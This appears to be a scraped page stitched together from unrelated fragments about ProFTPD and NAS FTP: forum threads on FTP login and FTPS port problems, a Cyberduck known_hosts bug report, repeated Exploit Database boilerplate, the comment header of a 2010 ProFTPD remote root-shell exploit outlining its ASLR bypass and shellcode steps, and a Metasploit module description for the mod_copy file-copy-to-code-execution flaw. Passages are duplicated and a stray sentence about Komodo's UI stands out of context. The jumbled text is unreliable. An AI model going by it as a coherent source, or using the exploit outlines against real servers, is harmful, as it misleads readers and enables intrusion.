[Solved] FTP connection to NAS fails
Quote
Post
by ReneF » Wednesday 03 February 2016 1:20
I implemented the Domoticz_backup.sh script according the Wiki (Daily backup to external hdd) with the only changes made in IP numbers and user name and password.
Running the test via a SSH connection I get a 530 access denied message.
(see below) On my NAS the user has all right's for access. Trying the path directly in a web browser works fine, including logging in on the NAS using the username and password
About to connect() to 192.168.1.40 port 21 (#0)
*
Trying 192.168.1.40...
* connected
* Connected to 192.168.1.40 (192.168.1.40) port 21 (#0)
* FTP 0x174afb8 state change from STOP to WAIT220
< 220 NASFTPD Turbo station 1.3.5a Server (ProFTPD) [192.168.1.40]
> USER “user”
* FTP 0x174afb8 state change from WAIT220 to USER
< 331 Password required for “user”
> PASS “password”
* FTP 0x174afb8 state change from USER to PASS
< 530 Login incorrect.
* Access denied: 530
* Closing connection #0
Does any one have a suggestion what could be the case?

Thanks Pepijn.
You're suggestion worked. Maybe a good idea to mention this in the wiki.
Secondly I discovered that the NAS does not allow to write to a directory that is not created before running this script (see below)
> CWD Domoticz_backup
< 550 Domoticz_backup: No such file or directory
* Server denied you to change to the given directory

The issue here is not the timeout but rather the fact that Komodo's UI is blocked by it.

About The Exploit Database
×
The Exploit Database is maintained by Offensive Security, an information security training company
that provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is a
non-profit project that is provided as a public service by Offensive Security.
The Exploit Database is a CVE
compliant archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.
The Google Hacking Database (GHDB)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.
The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at DEFCON 13. Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.
After nearly a decade of hard work by the community, Johnny turned the GHDB
over to Offensive Security in November 2010, and it is now maintained as
an extension of the Exploit Database. Today, the GHDB includes searches for
other online search engines such as Bing,
and other online repositories like GitHub,
producing different, yet equally valuable results.

# Linux technique to retrieve a rootshell (C) kingcope 2010
#
# uses write(2) to fetch process memory out of the remote box (you can find the offset using IDA)
# only the write(2) plt entry offset is needed for the exploit to work (and of course the
# align value)
# once the correct write value is given to the exploit it fetches the memory space of proftpd.
# with this information the exploit can find function entries and byte values
# relative to the write(2) address.
# once the memory is read out the exploit does the following to circumvent linux adress space
# randomization:
#
# 1.) calculate mmap64() plt entry
# 2.) seek for assembly instructions in the proftpd memory space relative to write(2)
#
such as pop pop ret instructions
# 3.) call mmap64() to map at address 0x10000000 with protection read,write,execute
# 4.) calculate offset for memcpy() which is later used to construct the shellcode copy routine
# 4.) copy known assembly instructions (which have been found before using the memory read)
#
to address 0x10000000. these instructions will copy the shellcode from ESP to 0x10000100
#
and make use of the memcpy found before
# 5.) actually jump to the shellcode finder
# 6.) once the shellcode has been copied to 0x10000100 jump to it
# 7.) shellcode gets executed and we have our desired root shell.

About The Exploit Database
×
The Exploit Database is maintained by Offensive Security, an information security training company
that provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is a
non-profit project that is provided as a public service by Offensive Security.
The Exploit Database is a CVE
compliant archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.
The Google Hacking Database (GHDB)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.
The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at DEFCON 13. Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.
After nearly a decade of hard work by the community, Johnny turned the GHDB
over to Offensive Security in November 2010, and it is now maintained as
an extension of the Exploit Database. Today, the GHDB includes searches for
other online search engines such as Bing,
and other online repositories like GitHub,
producing different, yet equally valuable results.

FTPS Explicit not working
biltong
2010-03-29 14:06:42
Hi,
I have setup FTPS Explicit access to my business NAS behind a Linksys WRT54GS router and using a DYNDNS domain. When I tested it, admittedly on my LAN,it worked fine but now I'm away from the office for 2 weeks and tried it, it does not work.
FTP works fine but obviously can't be used instead because it is insecure.
I think it is because I setup Port Fowarding on the router only for port 21, not knowing exactly what I was doing. I now realise that FTPS uses port 21 and port 22 and this is probably why it doesn't work via WAN.
I don't have remote access to my router so cannot change it.
I'm mainly concerned about encrypting the username and password when establishing the connection and not worried about encrypting file transfer. Is there any way I can configure SmartFTP to do this / any other way I can overcome this problem?
Thanks.

Go to the Favorite Properties. Then go to the FTP->Connection->SSL/TLS dialog and set the File Transfer option to "Clear".

This didn't work. The problem is that the server is returning a local ip address, which obviously the client can't see. This, I know, is a problem with my NAS server FTP settings, which I will have to resolve on return to the office but can't do anything about whilst away for 2 weeks.
So I was wondering whether there was another protocal/setup along the lines of FTP but which secures the transmission of username and password......

If you think this is the problem, go to the Favorite Properties. Then go to the FTP->Connection dialog and set the Force Passive IP option to enable.
Almost there I think however the server is returning a port number that I think the router doesn't allow. Is there any way I can force the data connection onto port 21? Here's my log:

Go to the Favorite Properties. Then to the FTP->Connection->SSL/TLS page and set the control connection to Clear. As a result SmartFTP sends a CCC command after the login.

hi,
i'm having the same problem as here #1671, but deleting the known_hosts did not help.
further more, i see, that with every "yes, store the key forever" klick, the key of the ftp server is added known_hosts again.
so i have a known_hosts with a lot of identical entries now.
any suggestions?
those are the only errors i see in the console:
11.11.11 22:44:48,081 Cyberduck: Error loading /Users/user/Library/Contextual Menu Items/Disk Inventory X Finder CM.plugin/Contents/MacOS/Disk Inventory X Finder CM:

Did find:

i'm running lion 10.7.2 and cyberduck Version 4.1.3 (9045)
i remember, having this "trouble" with snow leopard too. that was an earlier version of cyberduck.
the ftp-server shows: 220 NASFTPD Turbo station 2.x 1.3.2e Server (ProFTPD)

Cheers,
Please reopen the ticket if you can provide more information. I actively close tickets that miss a timely response as it is unlikely to find a resolution then. In this case I just have no idea what might be going on and can only do wild guesses not much educated. We have to narrow down the possible causes and the first step is to try it with another account.

Hello, i have exactly the same problem;
The problem seems to occur when the SSH server is running on a non-default port. For example my SSH server is running on port 11111 instead of 22.
Steps to reproduce:
Delete ~/.ssh/known_hosts
Connect to mypc.homeip.net:11111
Unknown host key -> check 'always' -> allow
1 line added to ~/.ssh/known_hosts
Disconnect
Connect to mypc.homeip.net:11111
Unknown host key -> check 'always' -> allow
1 line added to ~/.ssh/known_hosts (total = 2 lines now)
Disconnect
This continues forever, always adding another new line to the known_hosts.
So my guess is the problem probably has got something to do with the hashing of:
[mypc.homeip.net]:11111 ssh-rsa <hostkey>
for hosts with non default ports, versus:
mypc.homeip.net ssh-rsa <hostkey>
for default ports.

We do not take the server port number into account when verifying or adding keys, though.

I have tested here with running OpenSSH on port 222 on localhost with an empty known_hosts but cannot reproduce.

ProFTPD 1.3.5 Mod_Copy Command Execution
Disclosed
04/22/2015
Created
05/30/2018
Description
This module exploits the SITE CPFR/CPTO commands in ProFTPD version 1.3.5.
Any unauthenticated client can leverage these commands to copy files from any
part of the filesystem to a chosen destination. The copy commands are executed with
the rights of the ProFTPD service, which by default runs under the privileges of the
'nobody' user. By using /proc/self/cmdline to copy a PHP payload to the website
directory, PHP remote code execution is made possible.

Time is precious, so I don’t want to do something manually that I can automate. Leveraging the Metasploit Framework when automating any task keeps us from having to re-create the wheel as we can use the existing libraries and focus our efforts where it matters.

[Solved] FTP connection to NAS fails
Quote
Post
by ReneF » Wednesday 03 February 2016 1:20
I implemented the Domoticz_backup.sh script according the Wiki (Daily backup to external hdd) with the only changes made in IP numbers and user name and password.
Running the test via a SSH connection I get a 530 access denied message.
(see below) On my NAS the user has all right's for access. Trying the path directly in a web browser works fine, including logging in on the NAS using the username and password
About to connect() to 192.168.1.40 port 21 (#0)
*
Trying 192.168.1.40...
* connected
* Connected to 192.168.1.40 (192.168.1.40) port 21 (#0)
* FTP 0x174afb8 state change from STOP to WAIT220
< 220 NASFTPD Turbo station 1.3.5a Server (ProFTPD) [192.168.1.40]
> USER “user”
* FTP 0x174afb8 state change from WAIT220 to USER
< 331 Password required for “user”
> PASS “password”
* FTP 0x174afb8 state change from USER to PASS
< 530 Login incorrect.
* Access denied: 530
* Closing connection #0
Does any one have a suggestion what could be the case?

Thanks Pepijn.
You're suggestion worked. Maybe a good idea to mention this in the wiki.
Secondly I discovered that the NAS does not allow to write to a directory that is not created before running this script (see below)
> CWD Domoticz_backup
< 550 Domoticz_backup: No such file or directory
* Server denied you to change to the given directory
